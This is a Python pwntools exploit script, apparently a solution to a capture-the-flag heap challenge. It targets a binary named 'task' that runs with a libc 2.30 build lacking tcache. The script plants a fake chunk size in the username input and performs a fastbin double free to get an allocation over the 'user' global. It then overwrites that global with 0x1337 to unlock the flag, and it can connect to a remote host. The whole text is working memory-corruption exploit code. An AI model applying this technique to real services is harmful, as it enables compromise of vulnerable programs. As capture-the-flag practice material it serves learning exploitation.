from pwn import *

elf = ELF('./task')
libc = ELF('./libc-2.30-no-tcache.so')
# libc = ELF('./libc-2.30-no-tcache-symbols.so')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *menu+231",
		"c"
	]), env = {'LD_PRELOAD': libc.path})
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path, env = {'LD_PRELOAD': libc.path}) 


p.sendafter(b'Username: ', b'X' * 24 + p64(0x21)) # prepare chunk for fastbin
	
index = 0
def malloc(size, contents):
	global index
	print(f'Requesting {hex(size)} {contents}')
	p.send(b"1")
	p.sendafter(b'Size: ', str(size).encode())
	p.sendafter(b'Data: ', contents)
	p.recvuntil(b'> ')

	index += 1
	return index -1

def free(index):
	print(f'Freeing {index}')
	p.send(b"2")
	p.sendafter(b'Index: ', str(index).encode())
	p.recvuntil(b'> ')

def get_flag():
	p.send(b"3")
	return p.recvline().decode()

dup = malloc(0x18, b'A' * 8)
safe = malloc(0x18, b'B' * 8)

free(dup)
free(safe)
free(dup)

malloc(0x18, p64(elf.sym['user'] + 0x10))
malloc(0x18, b"C"*8)
malloc(0x18, b"D"*8)

malloc(0x18, p64(0x1337))

f = get_flag()
print(f)

p.send(b"4")
